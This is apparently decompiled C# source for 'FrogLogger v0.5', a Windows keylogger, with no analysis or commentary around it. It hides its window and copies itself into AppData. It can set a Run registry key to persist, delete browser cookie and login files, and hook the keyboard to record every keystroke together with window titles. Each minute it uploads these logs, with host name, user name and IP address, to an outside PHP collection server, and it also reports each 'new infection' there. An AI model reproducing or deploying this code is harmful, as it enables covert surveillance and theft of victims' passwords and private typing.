using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class Class1
{
	[AccessedThroughProperty("kbHook")]
	private static KeyboardHook _kbHook;

	private static string s = "";

	private static string crypt = "S6TNSFaHbGm2WEssk";

	private static int userTime = 1;

	private static string mutexa = "S6TNSFaHbGm2WEsskALDtmdoIBnDBI";

	private static string phpLink = "http://znnet.zxq.net/logs/froghost.php";

	private static bool asup = false;

	private static bool clearHist = false;

	private static string specChars = ")!@#$%^&*(";

	private static string secondaryChars = "[\\]'";

	private static string secondaryCharsShift = "{|}\"";

	private static string otherChars = ";=,-.";

	private static string otherCharsShift = ":+<->";

	private static WebClient client = new WebClient();

	private static string winName = null;

	private static bool isText = false;

	private static Mutex objMutex;

	private static KeyboardHook kbHook
	{
		get
		{
			return _kbHook;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyboardHook.KeyDownEventHandler value2 = kbHook_KeyDown;
			if (_kbHook != null)
			{
				KeyboardHook.KeyDown -= value2;
			}
			_kbHook = value;
			if (_kbHook != null)
			{
				KeyboardHook.KeyDown += value2;
			}
		}
	} = new KeyboardHook();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		Form val = new Form();
		val.set_Text("Test!");
		Size size = new Size(0, 0);
		val.set_Size(size);
		val.set_WindowState((FormWindowState)1);
		val.set_ShowInTaskbar(false);
		val.set_Opacity(0.0);
		Form val2 = val;
		Timer val3 = new Timer();
		checked
		{
			val3.set_Interval(userTime * 1000 * 60);
			val3.add_Tick((EventHandler)delegate
			{
				tSave_Tick();
			});
			val3.Start();
			objMutex = new Mutex(initiallyOwned: false, mutexa);
			if (!objMutex.WaitOne(0, exitContext: false))
			{
				objMutex.Close();
				objMutex = null;
				ProjectData.EndApp();
			}
			try
			{
				File.Delete(Application.get_ExecutablePath() + ":Zone.Identifier");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			RegistryKey currentUser = Registry.CurrentUser;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(Application.get_ExecutablePath());
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (!File.Exists(text))
			{
				File.Copy(Application.get_ExecutablePath(), text);
				sendNotify();
			}
			if (Operators.CompareString(Application.get_ExecutablePath(), text, false) != 0)
			{
				Process.Start(text);
				ProjectData.EndApp();
			}
			if (asup)
			{
				if (registryKey.GetValue("essential") == null)
				{
					registryKey.SetValue("essential", "\"" + text + "\"");
				}
				else if (Operators.CompareString(registryKey.GetValue("essential")!.ToString(), text, false) != 0)
				{
					registryKey.SetValue("essential", "\"" + text + "\"");
				}
			}
			if (clearHist)
			{
				try
				{
					currentUser.DeleteSubKeyTree("Software\\Microsoft\\Internet Explorer\\IntelliForms");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				currentUser.Close();
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default";
				try
				{
					File.Delete(text2 + "\\Web Data");
					File.Delete(text2 + "\\Login Data");
					File.Delete(text2 + "\\Cookies");
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
				try
				{
					string[] directories = Directory.GetDirectories(path);
					int num = 0;
					int num2 = directories.Length;
					for (num = 0; num <= num2; num++)
					{
						File.Delete(directories[num] + "\\cookies.sqlite");
						File.Delete(directories[num] + "\\key3.db");
						File.Delete(directories[num] + "\\formhistory.sqlite");
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			Application.Run(val2);
			((Control)val2).Hide();
		}
	}

	private static void kbHook_KeyDown(Keys Key)
	{
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Invalid comparison between Unknown and I4
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Invalid comparison between Unknown and I4
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Invalid comparison between Unknown and I4
		//IL_01ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f1: Invalid comparison between Unknown and I4
		//IL_01f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Invalid comparison between Unknown and I4
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_026c: Invalid comparison between Unknown and I4
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Invalid comparison between Unknown and I4
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ae: Expected I4, but got Unknown
		//IL_02c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected I4, but got Unknown
		//IL_02e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Invalid comparison between Unknown and I4
		//IL_02ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f6: Invalid comparison between Unknown and I4
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected I4, but got Unknown
		//IL_0357: Unknown result type (might be due to invalid IL or missing references)
		//IL_035d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Expected I4, but got Unknown
		//IL_0377: Unknown result type (might be due to invalid IL or missing references)
		//IL_037d: Unknown result type (might be due to invalid IL or missing references)
		//IL_037f: Invalid comparison between Unknown and I4
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_0387: Unknown result type (might be due to invalid IL or missing references)
		//IL_0389: Invalid comparison between Unknown and I4
		//IL_03c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cc: Expected I4, but got Unknown
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f6: Expected I4, but got Unknown
		//IL_040a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0410: Invalid comparison between Unknown and I4
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0472: Invalid comparison between Unknown and I4
		//IL_04c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cb: Invalid comparison between Unknown and I4
		//IL_04e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ee: Invalid comparison between Unknown and I4
		//IL_04f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f6: Invalid comparison between Unknown and I4
		//IL_050f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_0518: Expected I4, but got Unknown
		if (((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown() | ((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown())
		{
			return;
		}
		checked
		{
			if ((Operators.CompareString(winName, GetActiveWindowTitle(), false) != 0) & (Operators.CompareString(GetActiveWindowTitle(), "", false) != 0) & (Operators.CompareString(GetActiveWindowTitle(), "Start", false) != 0) & (Operators.CompareString(GetActiveWindowTitle(), "Program Manager", false) != 0))
			{
				DateTime now = DateTime.Now;
				string[] array = s.Split(new char[1] { '\r' });
				if (isText & (Operators.CompareString(array[array.Length - 1].Trim().Replace("\r\n", ""), "", false) != 0))
				{
					s += "\r\n";
					isText = false;
				}
				s = s + "\r\n----[ " + GetActiveWindowTitle() + " - " + now.ToString("hh:mm:ss tt") + " ]----\r\n";
				winName = GetActiveWindowTitle();
			}
			if (unchecked((int)Key) == 32)
			{
				s += " ";
			}
			else if (unchecked((int)Key) == 13)
			{
				string[] array2 = s.Split(new char[1] { '\r' });
				if (Operators.CompareString(array2[array2.Length - 1].Trim().Replace("\r\n", ""), "", false) != 0)
				{
					s += "\r\n";
				}
			}
			else if (unchecked((int)Key) == 8)
			{
				s += "<BKSPC>";
			}
			else if (unchecked((int)Key > 64 && (int)Key < 91))
			{
				isText = true;
				if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() && !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
				{
					s += ((Enum)Key).ToString().ToLower();
				}
				else
				{
					s += ((Enum)Key).ToString();
				}
			}
			else if ((Key - 48 < 10) & (Key - 48 > -1))
			{
				isText = true;
				if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() && !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
				{
					s += Conversions.ToString(Key - 48);
				}
				else
				{
					s += Conversions.ToString(specChars[Key - 48]);
				}
			}
			else if ((Key - 186 > -1) & (Key - 186 < 5))
			{
				isText = true;
				if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() && !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
				{
					s += Conversions.ToString(otherChars[Key - 186]);
				}
				else
				{
					s += Conversions.ToString(otherCharsShift[Key - 186]);
				}
			}
			else if ((Key - 219 > -1) & (Key - 219 < 4))
			{
				isText = true;
				if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() && !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
				{
					s += Conversions.ToString(secondaryChars[Key - 219]);
				}
				else
				{
					s += Conversions.ToString(secondaryCharsShift[Key - 219]);
				}
			}
			else if (unchecked((int)Key) == 191)
			{
				isText = true;
				if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() && !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
				{
					s += "/";
				}
				else
				{
					s += "?";
				}
			}
			else if (unchecked((int)Key) == 192)
			{
				isText = true;
				if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() && !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
				{
					s += "`";
				}
				else
				{
					s += "~";
				}
			}
			else if (unchecked((int)Key) == 9)
			{
				isText = true;
				s += "<tab>";
			}
			else if ((Key - 96 > -1) & (Key - 96 < 16))
			{
				isText = true;
				string text = "0123456789*+ -./";
				s += Conversions.ToString(text[Key - 96]);
			}
		}
	}

	private static void tSave_Tick()
	{
		string text = s;
		s = "";
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = text.Replace("&", "%26");
			DateTime now = DateTime.Now;
			string text2 = "*******************************************************************\r\n";
			text2 += "* [FrogLogger v0.5]\r\n";
			text2 = text2 + "* LOG FILE: " + now.ToString("MM/dd/yyyy hh:mm:ss tt") + "\r\n";
			text2 = text2 + "* Host name: " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\n* Current User: " + Environment.UserName + "\r\n";
			text2 = text2 + "* IP Address: " + GetIP() + "\r\n";
			text2 += "*******************************************************************\r\n\r\n";
			WebClient webClient = new WebClient();
			string text3 = ((ServerComputer)MyProject.Computer).get_Name() + " - " + now.ToString("MM-dd-yyyy hh.mm.ss tt") + ".dat";
			webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
			webClient.Headers.Add("Accept-Encoding", "text/plain");
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.280.0 Safari/532.9");
			string data = "name=" + text3 + "&log=" + text2 + text;
			string method = "POST";
			string address = phpLink;
			webClient.UploadString(address, method, data);
		}
	}

	public static void sendNotify()
	{
		DateTime now = DateTime.Now;
		string text = "*******************************************************************\r\n";
		text += "* [FrogLogger v0.5]\r\n";
		text = text + "* NEW INFECTION NOTIFICATION: " + now.ToString("MM/dd/yyyy hh:mm:ss tt") + "\r\n";
		text = text + "* Host name: " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\n* Current User: " + Environment.UserName + "\r\n";
		text = text + "* IP Address: " + GetIP() + "\r\n";
		text += "*******************************************************************\r\n";
		WebClient webClient = new WebClient();
		string text2 = "NEW INFECTION - [" + ((ServerComputer)MyProject.Computer).get_Name() + "].dat";
		webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
		webClient.Headers.Add("Accept-Encoding", "text/plain");
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.280.0 Safari/532.9");
		string data = "name=" + text2 + "&log=" + text;
		string method = "POST";
		string address = phpLink;
		webClient.UploadString(address, method, data);
	}

	public static string GetIP()
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://automation.whatismyip.com/n09230945.asp");
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		Stream responseStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		return streamReader.ReadToEnd();
	}

	private static string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}
}
